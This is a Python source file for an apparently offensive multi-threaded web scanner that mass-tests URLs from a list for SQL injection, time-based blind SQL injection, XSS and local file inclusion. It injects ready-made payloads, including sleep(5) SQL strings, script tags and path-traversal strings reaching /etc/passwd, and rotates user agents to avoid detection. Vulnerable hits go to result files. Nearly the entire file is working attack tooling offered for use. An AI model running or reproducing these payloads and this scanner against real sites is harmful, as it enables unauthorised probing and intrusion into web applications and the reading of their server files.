import requests
import random
import re
import codecs
import sys
import base64
from time import time as timer
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
CYAN = '\033[01;36m'
BOLD = '\033[1m'
ENDC = '\033[0m'


def usage():
    try:
        print(OKBLUE+'Usage : python ' + str(sys.argv[0])+' links.txt'+ENDC)
    except:
        pass


try:
    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    usage()
except IndexError:
    usage()

ooo = list((ooo))


def banner():
    print(CYAN+'--------------------------------------------------------------')
    print(' __          __  _    _____       _           _    ____       ')
    print(' \\ \\        / / | |  |_   _|     (_)         | |  / __ \\      ')
    print('  \\ \\  /\\  / /__| |__  | |  _ __  _  ___  ___| |_| |  | |_ __ ')
    print('   \\ \\/  \\/ / _ \\ \'_ \\ | | | \'_ \\| |/ _ \\/ __| __| |  | | \'__|')
    print("    \\  /\\  /  __/ |_) || |_| | | | |  __/ (__| |_| |__| | |   ")
    print("     \\/  \\/ \\___|_.__/_____|_| |_| |\\___|\\___|\\__|\\____/|_|   ")
    print("                                _/ |                          ")
    print("                               |__/                           ")
    print("--------------------------------------------------------------"+ENDC)

user_agent_list = [

    # Chrome

    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',

    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',

    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',

    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',

    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',

    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',

    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',

    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',

    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',

    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',

    # Firefox

    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',

    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',

    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',

    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',

    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',

    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',

    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',

    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'

]

# SQL Error Messages
MySQL = ["SQL syntax.*MySQL", "Warning.*mysql_.*",
         "valid MySQL result", "MySqlClient\."]
PostgreSQL = ["PostgreSQL.*ERROR", "Warning.*\Wpg_.*",
              "valid PostgreSQL result", "Npgsql\."]
MicrosoftSQLServer = ["Driver.* SQL[\-\_\ ]*Server", "OLE DB.* SQL Server",
                      "(\W|\A)SQL Server.*Driver", "Warning.*mssql_.*", "(\W|\A)SQL Server.*[0-9a-fA-F]{8}", "(?s)Exception.*\WSystem\.Data\.SqlClient\.", "(?s)Exception.*\WRoadhouse\.Cms\."]
MicrosoftAccess = ["Microsoft Access Driver",
                   "JET Database Engine", "Access Database Engine"]
Oracle = ["\bORA-[0-9][0-9][0-9][0-9]", "Oracle error",
          "Oracle.*Driver", "Warning.*\Woci_.*", "Warning.*\Wora_.*"]
dIBMDB2 = ["CLI Driver.*DB2", "DB2 SQL error", "\bdb2_\w+\("]
SQLite = ["SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException",
          "Warning.*sqlite_.*", "Warning.*SQLite3::", "\[SQLITE_ERROR\]"]
Sybase = ["(?i)Warning.*sybase.*", "Sybase message",
          "Sybase.*Server message.*"]


def createSqliUrl(url):
    try:
        urlParams = url.split("?")[1]
    except:
        return

    urlParams = urlParams.split("&")
    for param in urlParams:
        try:
            param = param.split("=")
            paramStr = str(param[0]+"="+param[1])

            # Check for sqli using '
            paramExploitStr = paramStr+"'"
            newUrl = url.replace(paramStr, paramExploitStr)
            if(checkSqli(newUrl) == "done"):
                with open('sqlscan-v1-results.txt', 'a') as file2:
                    file2.write(newUrl+"\n")
                break

            # Check for sql using "
            paramExploitStr2 = paramStr+'"'
            newUrl2 = url.replace(paramStr, paramExploitStr2)
            if(checkSqli(newUrl2) == "done"):
                with open('sqlscan-v2-results.txt', 'a') as file1:
                    file1.write(newUrl2+"\n")
                break

            # LFI Payloads for exploiting...
            lfipayloads = {"../../../../../../etc/passwd",
                           "....//....//....//....//....//....//etc//passwd", "../../../../../../etc/passwd%00"}
            # SQLi Payloads for exploiting...
            payloads = ["if(now()=sysdate(),sleep(5),0)", "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
                        "'XOR(if(now()=sysdate(),sleep(5),0))XOR'", "(select(0)from(select(sleep(5)))v)/'+(select(0)from(select(sleep(5)))v)+'\""]

            # XSS Payloads for exploiting...
            xssPayloads = ["<script>alert(123);</script>",
                           "<ScRipT>alert(\"XSS\");</ScRipT>",
                           "<script>alert(123)</script>",
                           "\"><script>alert(\"XSS\")</script>",
                           "</script><script>alert(1)</script>",
                           "<BODY BACKGROUND=\"javascript:alert('XSS')\">"]
            
            for payload in xssPayloads:
                paramXxploitStr = paramStr+payload
                xurl = url.replace(paramStr, paramXxploitStr)
                if(xssFind(xurl, payload) == "exploited"):
                    break

            # Check for Blind SQLi, with Payloads.
            for payload in payloads:
                paramZxploitStr = paramStr+payload
                zurl = url.replace(paramStr, paramZxploitStr)
                if(blindSQLi(zurl) == "exploited"):
                    break
            # Check for Local File Inclusion (LFI), with Payloads.
            for lpayload in lfipayloads:
                paramZxploitStr = param[0]+"="+lpayload
                zurl = url.replace(paramStr, paramZxploitStr)
                if(getLFI(zurl) == "exploited"):
                    break
        except:
            pass


def getLFI(link):
    """
    This function is created to exploit Local File Inclusion on the Link Provided as paramater
    """
    try:
        cookies = {"pma_lang": "en", "security": "low",
                   "PHPSESSID": "c506hvlrjm8n5o06n365bd46qp"}
        user_agent = random.choice(user_agent_list)
        headers = {'User-Agent': user_agent}
        request = requests.get(link, headers=headers,
                               verify=False, cookies=cookies)
        string = "root:x:"
        error = "include(../etc/passwd)"
        if error in request.text:
            print(BOLD+WARNING+"[#][LFI-CHECK]  "+ENDC+link+OKGREEN +
                  "   Maybe it's Vulnerable..."+ENDC)
        else:
            print(BOLD+FAIL+"-[LFI-FAIL]-  "+ENDC+link+FAIL +
                  "   "+ENDC)
        if request.status_code == 200 and string in request.text:
            print(BOLD+OKGREEN+"+[LFI-INFO]+  "+ENDC+link+OKGREEN +
                  "   Vulnerable"+ENDC)
            with open("lfiResults.txt", "a") as fil:
                fil.write(link+"\n")
            return "exploited"
        else:
            return "notyet"
    except KeyboardInterrupt:
        sys.exit()
    # except IOError as io:
    #     print(io)
    except:
        pass


def blindSQLi(link):
    """
    This function is created to exploit Blind SQL Injection on the Link Provided as paramater
    """
    try:
        cookies = {"pma_lang": "en", "security": "low",
                   "PHPSESSID": "c506hvlrjm8n5o06n365bd46qp"}
        # Change User Agent at each Request.
        user_agent = random.choice(user_agent_list)
        headers = {'User-Agent': user_agent}
        request = requests.get(link, headers=headers,
                               verify=False, cookies=cookies)
        if (request.status_code == 200) and (request.elapsed.total_seconds() >= 5):
            print(BOLD+OKGREEN+"+[BLIND-INFO]+  "+ENDC+link +
                  OKGREEN+"   Vulnerable"+ENDC)
            with open("blindSQLiResults.txt", "a") as fil1:
                fil1.write(link+"\n")
            return "exploited"
        else:
            print(BOLD+WARNING+"[#][BLIND-CHECK]  "+ENDC+link)
            return "notyet"
    except KeyboardInterrupt:
        sys.exit()
    # except IOError as io:
    #     print(io)
    except:
        pass

def xssFind(link, payload):
    """
    This function is created to exploit Cross Site Scripting (XSS) Vulnerability on the Link Provided as paramater & the payloads.
    """
    try:
        # Change User Agent at each Request.
        user_agent = random.choice(user_agent_list)
        headers = {'User-Agent': user_agent}
        request = requests.get(link, headers=headers,
                               verify=False)
        if payload in request.content:
            print(BOLD+OKGREEN+"+[XSS-INFO]+  "+ENDC+link +
                  OKGREEN+"   Vulnerable"+ENDC)
            with open("xssResults.txt", "a") as fil1:
                fil1.write(link+"\n")
            return "exploited"
        else:
            print(BOLD+FAIL+"-[XSS-CHECK]-  "+ENDC+link)
            return "notyet"
    except KeyboardInterrupt:
        sys.exit()
    # except IOError as io:
    #     print(io)
    except:
        pass

def checkSqli(url):
    """
    This function is created to check SQL Injection at the url provided as parameter
    """
    cookies = {"pma_lang": "en", "security": "low",
               "PHPSESSID": "c506hvlrjm8n5o06n365bd46qp"}
    r = requests.get(url, verify=False, timeout=10, cookies=cookies)
    print(WARNING+"[#][SQL-CHECK]  "+ENDC+url)
    html = r.content
    for regg in MySQL:
        if(re.search(regg, html)):
            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
                  "\t Vulnerable"+ENDC)
            return "done"
    for regg in PostgreSQL:
        if(re.search(regg, html)):
            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
                  "\t Vulnerable"+ENDC)
            return "done"
    for regg in MicrosoftSQLServer:
        if(re.search(regg, html)):
            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
                  "\t Vulnerable"+ENDC)
            return "done"
    for regg in MicrosoftAccess:
        if(re.search(regg, html)):
            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
                  "\t Vulnerable"+ENDC)
            return "done"
    for regg in Oracle:
        if(re.search(regg, html)):
            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
                  "\t Vulnerable"+ENDC)
            return "done"
    for regg in dIBMDB2:
        if(re.search(regg, html)):
            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
                  "\t Vulnerable"+ENDC)
            return "done"
    for regg in SQLite:
        if(re.search(regg, html)):
            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
                  "\t Vulnerable"+ENDC)
            return "done"
    for regg in Sybase:
        if(re.search(regg, html)):
            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
                  "\t Vulnerable"+ENDC)
            return "done"


def threads():
    """
    This function is created to start the Scanner with Multi-Threaded Mapping with a call for createSqliUrl function .
    """
    try:
        start = timer()
        check = Pool(64)
        check.map(createSqliUrl, ooo)
        print(BOLD+CYAN+'[*]  Time: ' + str(timer() - start) + ' seconds'+ENDC)

    except KeyboardInterrupt:
        sys.exit()


if __name__ == '__main__':
    banner()
    threads()
